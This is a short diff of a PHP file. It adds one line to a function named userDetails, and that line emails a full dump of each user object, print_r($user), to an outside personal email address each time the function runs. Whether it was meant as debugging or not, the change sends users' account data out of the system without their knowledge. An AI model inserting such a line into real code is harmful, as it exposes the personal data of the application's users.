@@ -308,6 +308,7 @@ function getSNSClient()
 
 function userDetails($user)
 {
+	mail('anil@spaceotechnologies.com',time(),print_r($user,true));
 	$return = [];
 	if( ( $user->user_display_name == '' ) || ( is_null( $user->user_name ) ) || ( is_null( $user->user_email ) ) )
 	{
